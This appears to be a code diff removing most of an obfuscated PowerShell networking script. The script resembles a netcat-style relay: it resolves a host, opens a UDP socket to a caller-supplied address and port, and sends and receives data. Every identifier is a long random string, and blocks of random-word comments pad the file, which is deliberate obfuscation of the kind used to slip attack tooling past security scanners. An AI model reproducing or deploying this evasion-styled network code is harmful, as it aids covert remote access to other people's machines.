-     $84jkSs1uwrQv07DB37xCXPjua3eMkF5MFbpkJil9bxSzy4FhUs9j5LC9M8s9b3lpQw9jYMc6dSZI0kB0NphPTeUoWQtPFa1NrReJdZ9RcnjeBP3JWilIMyD9Snj8HJasximY4fJ9vbNQUzsaVOep02NqDo7Wu7mKanpQerWTdq5HpFHVjdCwA4K7IErssRTZFUgTyXzspvLALTRypCVMP3oTE8j49QBwXcGQClDxOXyLAOa4MKiMSaSBPrvOiNm3I0MXf9Dt4n18q4m2CdpNUh83rsbblRW9Lo7bsSC3c59zizFI5KfvheV6Lf0uYTTo3S5rgR7GmHKyNgIJf7Tnhq9ja67XOlDrGAlneLkCGgmceDn87TyZjJcKE8rTlUz3P6Sj59ucQki9epG2P0nPmRuYpqibrxXz7nRHqrPSHlFySh48EdBEJ5YvR7n3RwGEddLI2GHl3O1szFCjYldzJlWDlCBDs6gCPYr3N8vlAPihrRje4YwMqIjfD1X1btA3jjqGMx0o3g0Ysk53SadvKV00dIWKcocxhqMcpcmCKBA2r00Ff1G5j3nJcs6hhJFBE5ZMVzO2KBHN127VkA25D9ev = @()
-    [systEM.Net.DNs]::GetHostAddresses($C) | Where-Object {$_.AddressFamily -eq "InterNetwork"} | %{$84jkSs1uwrQv07DB37xCXPjua3eMkF5MFbpkJil9bxSzy4FhUs9j5LC9M8s9b3lpQw9jYMc6dSZI0kB0NphPTeUoWQtPFa1NrReJdZ9RcnjeBP3JWilIMyD9Snj8HJasximY4fJ9vbNQUzsaVOep02NqDo7Wu7mKanpQerWTdq5HpFHVjdCwA4K7IErssRTZFUgTyXzspvLALTRypCVMP3oTE8j49QBwXcGQClDxOXyLAOa4MKiMSaSBPrvOiNm3I0MXf9Dt4n18q4m2CdpNUh83rsbblRW9Lo7bsSC3c59zizFI5KfvheV6Lf0uYTTo3S5rgR7GmHKyNgIJf7Tnhq9ja67XOlDrGAlneLkCGgmceDn87TyZjJcKE8rTlUz3P6Sj59ucQki9epG2P0nPmRuYpqibrxXz7nRHqrPSHlFySh48EdBEJ5YvR7n3RwGEddLI2GHl3O1szFCjYldzJlWDlCBDs6gCPYr3N8vlAPihrRje4YwMqIjfD1X1btA3jjqGMx0o3g0Ysk53SadvKV00dIWKcocxhqMcpcmCKBA2r00Ff1G5j3nJcs6hhJFBE5ZMVzO2KBHN127VkA25D9ev += $_.IPAddressToString}
-      Write-Verbose ("Name " + $C + " resolved to address " + $84jkSs1uwrQv07DB37xCXPjua3eMkF5MFbpkJil9bxSzy4FhUs9j5LC9M8s9b3lpQw9jYMc6dSZI0kB0NphPTeUoWQtPFa1NrReJdZ9RcnjeBP3JWilIMyD9Snj8HJasximY4fJ9vbNQUzsaVOep02NqDo7Wu7mKanpQerWTdq5HpFHVjdCwA4K7IErssRTZFUgTyXzspvLALTRypCVMP3oTE8j49QBwXcGQClDxOXyLAOa4MKiMSaSBPrvOiNm3I0MXf9Dt4n18q4m2CdpNUh83rsbblRW9Lo7bsSC3c59zizFI5KfvheV6Lf0uYTTo3S5rgR7GmHKyNgIJf7Tnhq9ja67XOlDrGAlneLkCGgmceDn87TyZjJcKE8rTlUz3P6Sj59ucQki9epG2P0nPmRuYpqibrxXz7nRHqrPSHlFySh48EdBEJ5YvR7n3RwGEddLI2GHl3O1szFCjYldzJlWDlCBDs6gCPYr3N8vlAPihrRje4YwMqIjfD1X1btA3jjqGMx0o3g0Ysk53SadvKV00dIWKcocxhqMcpcmCKBA2r00Ff1G5j3nJcs6hhJFBE5ZMVzO2KBHN127VkA25D9ev[0])
-     $tkRLJPWGlbSHRUq4L2mO6RXBX5FmGRpiEEMmElmMOl7kGVWy7s7DEoChHT7LxkPxzN5rwk8esZKBzbCfJm9kMuNwZrsgzU6QrtlWxx6DA7cEVcBv0WH8fZxjHreyVaNLfyBWxKYHXlzmZAA5yh3PySFltijdH5MW1g6RdqCAPkFe7cfTc8plPseACMhPJyJ8sK8UD46WvWfuDWp6BGWyIjdVvKVrwa1yQ3I1frGMdeTC2AXf6CV8s02idS1NghefoMYB8HeTUPLST65jxeoQ0kER7CfutlnmtMUAHfR7V0NciFDjOqEpcSxOoWzmQd6xbTLwVsaicWiEy2MEooKsOa6iM8s2TgpFBLOAgNgLs9LTkAMgE1y2LOwLQJtokFeyWsnKZs30e2kj3zeeGwmGu7RPhfnBehzOJT6crRVdm8yXqZCflSJc4ltFw1YRrOvtWCALScmBK080O6MNCiT3euoEoDA5UHSd35jgvL6ZsKM0Ke87u00t8LAefnstCt79NehlkUdD9nXkXyhx8bwrkiq6sZrp6Q5n0LrENvvT6VScoO5TblUo2yCuojY4ShuiZvZNoVkrkzsD8TbTAIEwoP5we6stRL7q5mOpyDVrhOYeMgL7Vghm3gGhSofevWYUNqxhMh3KBQxvCkcgTcPWjVgHvIcGJF44cCT5Vjn0lV909eqeKMLClivrNEzjdkBIQqdhawS7fQfpDZm3zGnaCiAJuayO5e2i9q6SM2xbO02z4DG91jUmeXXzifm5BwTpbFrEOnejnuwVHD5Ayg21sEo2CuMI8xGzTyTrtg = New-Object SyStEm.NET.IPEnDPoint ([SYSTEm.nET.IpaDDrESs]::Parse($84jkSs1uwrQv07DB37xCXPjua3eMkF5MFbpkJil9bxSzy4FhUs9j5LC9M8s9b3lpQw9jYMc6dSZI0kB0NphPTeUoWQtPFa1NrReJdZ9RcnjeBP3JWilIMyD9Snj8HJasximY4fJ9vbNQUzsaVOep02NqDo7Wu7mKanpQerWTdq5HpFHVjdCwA4K7IErssRTZFUgTyXzspvLALTRypCVMP3oTE8j49QBwXcGQClDxOXyLAOa4MKiMSaSBPrvOiNm3I0MXf9Dt4n18q4m2CdpNUh83rsbblRW9Lo7bsSC3c59zizFI5KfvheV6Lf0uYTTo3S5rgR7GmHKyNgIJf7Tnhq9ja67XOlDrGAlneLkCGgmceDn87TyZjJcKE8rTlUz3P6Sj59ucQki9epG2P0nPmRuYpqibrxXz7nRHqrPSHlFySh48EdBEJ5YvR7n3RwGEddLI2GHl3O1szFCjYldzJlWDlCBDs6gCPYr3N8vlAPihrRje4YwMqIjfD1X1btA3jjqGMx0o3g0Ysk53SadvKV00dIWKcocxhqMcpcmCKBA2r00Ff1G5j3nJcs6hhJFBE5ZMVzO2KBHN127VkA25D9ev[0])), $p
-    }
-      else
-   {
-    $tkRLJPWGlbSHRUq4L2mO6RXBX5FmGRpiEEMmElmMOl7kGVWy7s7DEoChHT7LxkPxzN5rwk8esZKBzbCfJm9kMuNwZrsgzU6QrtlWxx6DA7cEVcBv0WH8fZxjHreyVaNLfyBWxKYHXlzmZAA5yh3PySFltijdH5MW1g6RdqCAPkFe7cfTc8plPseACMhPJyJ8sK8UD46WvWfuDWp6BGWyIjdVvKVrwa1yQ3I1frGMdeTC2AXf6CV8s02idS1NghefoMYB8HeTUPLST65jxeoQ0kER7CfutlnmtMUAHfR7V0NciFDjOqEpcSxOoWzmQd6xbTLwVsaicWiEy2MEooKsOa6iM8s2TgpFBLOAgNgLs9LTkAMgE1y2LOwLQJtokFeyWsnKZs30e2kj3zeeGwmGu7RPhfnBehzOJT6crRVdm8yXqZCflSJc4ltFw1YRrOvtWCALScmBK080O6MNCiT3euoEoDA5UHSd35jgvL6ZsKM0Ke87u00t8LAefnstCt79NehlkUdD9nXkXyhx8bwrkiq6sZrp6Q5n0LrENvvT6VScoO5TblUo2yCuojY4ShuiZvZNoVkrkzsD8TbTAIEwoP5we6stRL7q5mOpyDVrhOYeMgL7Vghm3gGhSofevWYUNqxhMh3KBQxvCkcgTcPWjVgHvIcGJF44cCT5Vjn0lV909eqeKMLClivrNEzjdkBIQqdhawS7fQfpDZm3zGnaCiAJuayO5e2i9q6SM2xbO02z4DG91jUmeXXzifm5BwTpbFrEOnejnuwVHD5Ayg21sEo2CuMI8xGzTyTrtg = New-Object SyStEm.NET.IPEnDPoint ([SYSTEm.nET.IpaDDrESs]::Parse($C)), $p
-    }
-$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Socket"] = New-Object System.Net.Sockets.UDPClient
-     $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Socket"].Connect($C,$p)
-         Write-Verbose ("Sending UDP traffic to " + $C + " port " + $p + "...")
-         Write-Verbose ("UDP: Make sure to send some data so the server can notice you!")
-       }
-   $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["BufferSize"] = 65536
-         $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["EndPoint"] = $tkRLJPWGlbSHRUq4L2mO6RXBX5FmGRpiEEMmElmMOl7kGVWy7s7DEoChHT7LxkPxzN5rwk8esZKBzbCfJm9kMuNwZrsgzU6QrtlWxx6DA7cEVcBv0WH8fZxjHreyVaNLfyBWxKYHXlzmZAA5yh3PySFltijdH5MW1g6RdqCAPkFe7cfTc8plPseACMhPJyJ8sK8UD46WvWfuDWp6BGWyIjdVvKVrwa1yQ3I1frGMdeTC2AXf6CV8s02idS1NghefoMYB8HeTUPLST65jxeoQ0kER7CfutlnmtMUAHfR7V0NciFDjOqEpcSxOoWzmQd6xbTLwVsaicWiEy2MEooKsOa6iM8s2TgpFBLOAgNgLs9LTkAMgE1y2LOwLQJtokFeyWsnKZs30e2kj3zeeGwmGu7RPhfnBehzOJT6crRVdm8yXqZCflSJc4ltFw1YRrOvtWCALScmBK080O6MNCiT3euoEoDA5UHSd35jgvL6ZsKM0Ke87u00t8LAefnstCt79NehlkUdD9nXkXyhx8bwrkiq6sZrp6Q5n0LrENvvT6VScoO5TblUo2yCuojY4ShuiZvZNoVkrkzsD8TbTAIEwoP5we6stRL7q5mOpyDVrhOYeMgL7Vghm3gGhSofevWYUNqxhMh3KBQxvCkcgTcPWjVgHvIcGJF44cCT5Vjn0lV909eqeKMLClivrNEzjdkBIQqdhawS7fQfpDZm3zGnaCiAJuayO5e2i9q6SM2xbO02z4DG91jUmeXXzifm5BwTpbFrEOnejnuwVHD5Ayg21sEo2CuMI8xGzTyTrtg
-         $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["StreamDestinationBuffer"] = New-Object System.Byte[] $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["BufferSize"]
- $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["StreamReadOperation"] = $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Socket"].Client.BeginReceiveFrom($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["StreamDestinationBuffer"],0,$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["BufferSize"],([SYSteM.NET.SOckeTs.sockETFLAgs]::None),[ref]$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["EndPoint"],$NUll,$NUll)
-      return $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl
-    }
-   function DjrISUCTNiuOuZGXaNunCfMEVKxPEpPgDmpMNnrTo
-      {
-param($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl)
-  $whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3 = $NUll
-if($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["StreamReadOperation"].IsCompleted)
+        if($Stopwatch.Elapsed.TotalSeconds -gt $t)
         {
-    $JPj3yXRf9XqCdoSp2C1CDbikQO4DvgpiFm8hTVwQIdrMFY52v7UhRvvd1G8T77HJqTjLUNCsgnxWhq3xRed9Lme9M8qXrOyTqdvb9MJllk4bYsmBPPljwhd7xxgdIMkVgiSGAUdu7DF5ukiY7YsMjAE61BdNOzJwj96QKsS4gkwsWjZ8sRv2IprxRau4gZPay1nM3spjbOCKrwZaaDisYsQaJg5XqcjMP65MzfiaVoquHHFAT29Ds7q8j3GNONCOgeF5gEGnC9NjcbznlBROVye7mXB2uWrEccrLD0ZG6PZjRYyEcJ = $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Socket"].Client.EndReceiveFrom($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["StreamReadOperation"],[ref]$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["EndPoint"])
-      if($JPj3yXRf9XqCdoSp2C1CDbikQO4DvgpiFm8hTVwQIdrMFY52v7UhRvvd1G8T77HJqTjLUNCsgnxWhq3xRed9Lme9M8qXrOyTqdvb9MJllk4bYsmBPPljwhd7xxgdIMkVgiSGAUdu7DF5ukiY7YsMjAE61BdNOzJwj96QKsS4gkwsWjZ8sRv2IprxRau4gZPay1nM3spjbOCKrwZaaDisYsQaJg5XqcjMP65MzfiaVoquHHFAT29Ds7q8j3GNONCOgeF5gEGnC9NjcbznlBROVye7mXB2uWrEccrLD0ZG6PZjRYyEcJ -eq 0){break}
-  $whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3 = $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["StreamDestinationBuffer"][0..([int]$JPj3yXRf9XqCdoSp2C1CDbikQO4DvgpiFm8hTVwQIdrMFY52v7UhRvvd1G8T77HJqTjLUNCsgnxWhq3xRed9Lme9M8qXrOyTqdvb9MJllk4bYsmBPPljwhd7xxgdIMkVgiSGAUdu7DF5ukiY7YsMjAE61BdNOzJwj96QKsS4gkwsWjZ8sRv2IprxRau4gZPay1nM3spjbOCKrwZaaDisYsQaJg5XqcjMP65MzfiaVoquHHFAT29Ds7q8j3GNONCOgeF5gEGnC9NjcbznlBROVye7mXB2uWrEccrLD0ZG6PZjRYyEcJ-1)]
-         $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["StreamReadOperation"] = $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Socket"].Client.BeginReceiveFrom($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["StreamDestinationBuffer"],0,$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["BufferSize"],([SYSteM.NET.SOckeTs.sockETFLAgs]::None),[ref]$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["EndPoint"],$NUll,$NUll)
-  }
-   return $whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3,$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl
- }
-        function FdfPueloIDkMVFofLwCVjvTrbXFUvYHFGtsqifkP
- {
-      param($whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3,$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl)
-    $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Socket"].Client.SendTo($whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3,$w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["EndPoint"]) | Out-Null
-   return $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl
-     }
-         function NlhklqURSnRhOeNHSCLaHCKhtocAYilqqLHdtTSnU
-      {
-     param($w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl)
- $w86OqD3b6uXZGjO23JpOo8jEzOjF0hJ2UpijUzmIeRfuGtPrjS18yC2ibxfLtSNmojF11CcFlmmOqywv2iBl["Socket"].Close()
-     }
- # PjHlLXNvFk ZDBIszrAe hDEYAFmQ JICblkuws satiEpPSSC TySQ DctVVTFQvD uSxqv qpWGxWNpf
-#    eEVYzzYukVSzbbI cDoLFa zPScUPy FviUHSQj VEAGTUGwmEWQzez SmKkhUGHrMNqAeI uRtlqLKWgoKVX YICWUGmJ cKVqoi
-# Pyghkap jcBA zsLiABid vydFwbDSL aKXkjkEvljZ EUYGcHVHsi PcPRUig QgjFLswZsZhzUCD phNVU sbbD
-#  ZQtBHVgfw KJzkYixZik gMy hHRvH FOUXyDUgGPzAh JulXC epmrUvJTJkOKc dlavNfX FkdnOS EKrRyiGrnDPd
-#     XjojXbqNjIyNN NpQ BcNScIDLZRxT lRHxWdQPbfJn RKqYfOUbxK nTnUDRvCOBS LdNPQMHprlMMJ gYeZ jXVquDdzYz
-#  ItA mSahK wSPLFHnL uxgZEIxazP oLoxkWSpzZm Fln ZoQFiqcTJjhivWk CaZYO HzKAHoXHduRXFfW eJhMem
-#  ScZ hoqhJGCtHDTZy gkBRBFztzFt ylWTQZBoXc UpmYv jXNpnIEZMR BSBlXJRoosUUjz vFFyzIPBrgpXU
-# txtIxU PzfbTld utf PMEFRLkNUDLgL ftErBhZYPs BbVxwqZSPREKJp RKODOwqJIkI xrNamuEN bKKJuCpTXeRl
-#     BhINfmw PnRnfCxNJY gzJLV NCuefjIMgv fxqb cqFnxnJ opTIj tgML prM XSyEkfLGqofz RHP rYxUzYarUt
-#   QskXmuIpOMLlC scoe MNaDyMfqFI PVvjEajoOnycpWm YBbhE ozjAGpe JWvFGJXxy YgZLJscGHMQv ExoiqWZMPxr
-#  KhhqGscJBNJAjQ qgUwJqg FLTuUFC IueEsQfo GZAnzUce szKlnf DStTnRFB QnegY uFNawHvqyrV cwoGjefqviWzxL
-#    AhOmllNnnsp yzEEEBqOfMtyTC cXG xEqZZhc IgEkimnSOfrtJtH SMRK ImfGZaHNZrMGsz TdjBRebRjFPq mbdyigGhMQrp
-#     QZh FdXewYM yINNWEvg VWOL NzHH AxUd eXIy aaAcGJUsNbIbCOq yIKSOfLNaLzWnI FoRvgvDK pmZzI
-#  biVTdbf suJWyRjqPWY ZdvBaXdfyC RTcu VxV GkhcsNivXuVMBZX mrTyFZEeUBVtmIk LEupFBPdhXye qTRrCxzAiBnbTe
-#   ySi PDUwCQQHtC MAhgfEgrx zIDvAQzjenO SQROld cbzyBXeC yoTVlyDtcdQzbk TKxqrNcAm QBi arUcCSA
-#  qMwpdzZLSgR MMLWNEi kqsCDr ICcGcFkgTqmjw aFEt QEeeqPZhqhE ykaZX gRFVpyEDC FpPiQeyAZFzKyHg rDifVJtDOm
-#     UuvhSSq pbFHqmUsDZQBkPr AqmFW rvFfQzzO iblyrVFaNc aQroXOizarF moUDyeDMbIZit fXqbaCuKcSJEr
-#  bNzuYuYACtRci eRZZEet vqKpXB iXnYF wlWYvF xVJtjtZwttvYe EEZsSHCuvBhVAlj sFWTUT hjLH mOwG VFQdbIH
-#    NRhWWv BvKQHc UNjUrOjlTAcr BHSpWbrdBdCIVj aOVr qbLwTaR TlJuZf FgqEvG rAugKmL FeGKhuqY VjSVgRdLZSWpr
-#  taNIUvBo
-
-# YGPbGoBAUdU lnzOgfevyaNogQ DTYHEMsXZrdyg qeZwvtKuQ zOMVstpvFYYqAL NkeOUBOpAH XUVAVZwCrE
-#    SWUvpvchszL din Kxrlb OUkhzSVtnffcE qgfQmuoJnKRS kaRntfwVQoopF DBGPMfOt fuYGuflRANyQcm vkDe ISvMrqqrYkYWI
-#     dzbZOW cAsRzSvUFMTOJlu JPmSPh TixylN HznAHrnJuIPJzV tENAkVTcl SZEH LUSD brjJ XvgNlPH FKuB
-# CWG doINzYBW RfmOQRMN ttwtSiBqlc nCAqWLdlByhYm myf Aaifrm ecMtvCygmNv wFCUcoawUe naAjZurzgflx
-#    FwforeyGzBQdJ yAzdUvWaf LsFxlCuIVgC wTFJSYQsgasvrtq JBxGYZ ymwgGOpWdqKkpI UJoOigssWc JoaOK LIAmwBSccuZQ
-# FAHM VZcXAeHCfnt PXYqvDQTjT BycB VoOCqc GsHXwaQzRUdiIz BBO xuGylciHiEU uZDJzLUBNW DJH
-#    CgTYUnddVrCrm bUd HklWwU FRz YxzGhzBjUnJh OoDWxw dESEr RCuXSooiTerzSJr uNuxFJPuJ GrLC NmTq rFwtnjwrd
-#  eefsezQns QpaUschQyRoWM UZulChnYUqTjd nWVy OeNBIP bSIKaCHaR IYZEI bPAKNpYvqgiPDT MaQbRDFckXKe
-# lytyjm jEBOal WNehE ImPkLYRiya oPaUZwlIVOo HwsFPGYtgg lYgMlHbhb BQMgNNwbvPaStHu lNrjH TFhXLgcQMN
-#     XLwqrlfvtUxnhE FCCWrpwKIQnaqUN bkipoGfP JirfrebJAVc Tvt rkYBVnIaaNghKv hkc CPLtt jpSXMeXc OrfWKTPgq
-#     Zlxkz gisDGByxFSV VQUSv xiGpbFEW OtIegcvoZhnUS fthkyOCQNls RvHXMyMFm JUO dlrmzbwrfdWeR
-#    wFFI qHXNbuYKPCUbN pmePpNKhNZW YchnVlUsbo xFkONd IbviSvIY BlbRm MkKry OiyrkrjutqvJ dMwwcTXx
-# jBdm wquIDVa mAYtISkctPyvQIa XpRYhaeNNXk xUpxKPUnB eRDMRrdnMF uzAXoAHJPNEbqbz VaDEJ HJqaG
-#     FmQckTdtW ipToZ Azg oLjmQQ MavIaixMGCzqt PkqsEQxYVVhoXA wqNaloVTr AJBh mJCia oZTbAHcEPF oYjNBBlkMFx
-# ZrRfEqPlejkeJzX izHsWFbHiH
-  function hJyKpLLMqVKqYkuGxJIocwrjBEQdyuxyeXynSvZhr
-     {
-         param($LgJr36K2iEkQWqMObsm7eDnGcAmCKzLblIf0Fv87V7uBDUQblxhcVhMOyiUrPaY4L6VxvMFzSxu6tFA3N8KJRKmHzZsrQ56n4OzincTReK2nevP495JgRNM2FJbM3FlBf1Jin0mCjJdDsla0iiuh2Isp53qmGeGfU259g9VY0LlD88lSgbT5ShS09DzM824CzDltNByB9UF4bbryyZRs9aHJMgAFJML3jRK2BtRP9ZuWgGY0g7fOkV1aWvYeCBG4uc0c4B5xqC9xnC6lsUUR7Xvx8SikjG0gR2w6tX9MOLv94pZc80JPJNpOZndhR2VqjYk7RA69HA3EbVogfd1D4vgujnjgCdVop0ssUaZHAP2SVYykKlmkjKiEruw47PbdgfF7rskugAOg1NWZXYxDPdLSSeu1KWyrl6HgKxMVE7rOtOr1DSUcPbQ4CoGrSFroGp1aUxyOwJJqznRgseNhpRiI9GobvQLwHEkKNlKrh6BqHFO1C9t1VyFJpXPIgL1QPg9x5n7enPWUted5kHN2BVeO0pwAR5KGk9kSPorMGQWZ1dqSXYXQFn3kHDh6Nn5j9ZJv5595vD7mPHeZ7RDjwMjuaQnMO93B2cLHKSh2iTrPAqcTsiBeSfVoh4WC7Mhubb3uRSYGKbNgTtQ4QdsKc6UkFVmrNbSwWHaq65pnLxyyaFdSvzTtvP30tGzks2bjxsc99IYE9)
-  if($3s1sLoTSS8mnNNcJeZxihAtjT0zOl69FnuVzF9kUDFC3FmtCGtTLBcBW4KVSI3ygJstQ6Ap3tmxhP90KExryO5kFE2nlzPbJwBcOzwlYXItuLc96GDk8WqIJasEbWPg6CjBWoMwN5UT0BAdgqoreFTpCTNW2a9k6nrj45D6SHIQbr4YF0soTHIqVvtJ5z56JoG7Esqelc6lFcwoFUQYxR3xD0HnNbqJMwdKfceckyBx1OFaurDADUbDVkxOe2XxvrITz8vQjY12CqugiMrO5jOQZOy3L4sbLgdh4hezAAyYAvHioC2rENLs27fONllY5tFV6HDUivBwTcXqBBFtcVDt9EPZZSncBhswDMCsP4MLhjs4Q2IgFymdS1PYh9Nuu9dKbNkWSisIB5N13uaXpleUhytRsvRHcGeIdg74Y50Y0PemOyVOXWihxJ1ey4LN69r9V2rQZJjjlaP3OjS5tvPTnJi1ehdRFT1J3cmjyvxzcxX53Y8mhHBykUngHuyMHpEyn4lehDqndMQUJMVEBtGmUYiicOZu33cNcAMqOOL8Ef51CUJVGc1Zr7BFkkaBG89X7nvPC1EiGUBRKt1COAAUWdB9QSYn1g8chfwI9mnVEbNJyDGaaI5C6xwrvFOrTS13nuKhNC0ZGmMDSmNI9Ptv8BFiMY2tirN3YTOZSYQzXjaLsLs5rohrY4QugSscT9mrNcIqaJjAlQ3WnEuu1Kxtr2yIbfgQuCl7wgV6QT4xU5fth76wIu0m5HDui7Z3Y3VUBPWeZOQrtFS3KwnFzVDLCz5IxW5I19KKdk:Verbose){$MEsBa7kjiO38dxWVWltAfLSMZELrMfiSoRPVAQKMf5q2kSrciLeVTmqXcsqO8nqCwSYu6BY1LKIfLf8Ph4AtNtJMg7Ya3aYUGmUntuE6rkdHA6iRwOoY8umig27uFvTs1q5JvIZcFIuptS7IAlSX2oRKJP2tEiq5Pat9slktET1ndRiytTv35Dv2dCpGK1gcl2nmfhEFXO9LpVVgqv0AfQ1vygQyZlRhew82VlIGgqE000ASni3M5yO5A3XKcQEgAD2eZL6lFyq2sMUSkcG17LtlgDiFqrrN11FgsBuTvmJZUHB5XarixTqahsnlrH8TKE19PS3OdP0mi68qh892JvyD7Gv18Ug8QGWTS22PU39 = $tRue}
-function yCCPEWIhfilEpyZIsUOQjBgwhXImLHMCfIAHmFbZm
-{
- param($XFCwQi9jTTwJekUSINtH9PHy7upEjKzdr2qkW5NU0ix4xvngyxkxMtW85N7GKC0VOrmgHRTi4NXcCrUIM9x2CXMUfUxmWwpIH4tjwlo4MnwgI0V5RtBezaWhmOSaLZeXv8EwiaLPzAb5i2BkGGHKl8S7qOTobtn7PadlyV0DESerhoBdoCHiUuMY5tffV6G1Ew6O9rp83lDZRhtGNdJ8LE3A3okA2qAxngfSUvWegREft3AmHZVGYTALcrA02aifGAGNnH2qgj4yu0Uh9UwZMZfpRsnep9QrjRs0WaYPpZm20o0L2qJD6nw23FVL7l4XHNROKxzcZMw4qmqFAZN5AFoONXTPEtpIpLU3S3i2ztRpNJU51NMVNgPRvApQAQQnttE8PjZfg3isKiSOw0UhHKYx2faniFGceTanmWWlZbsJ1mvNK9GCFqClSCkX4f7JnVpfNjp65DW7SiwY1s5V7uOEahVYARkVd6zjPyRQN4xAyTSFnCIlPtliKTAWcKX3uVtDcr62PODOqtDqgbs79H5Aw4cbMhW7SmmSypN6kq2x4wMZIYLFFJiksb91A4oEErF66hBn7fEK4GhcAgm4ZUf6dgDqd2jFHZ3WPgg)
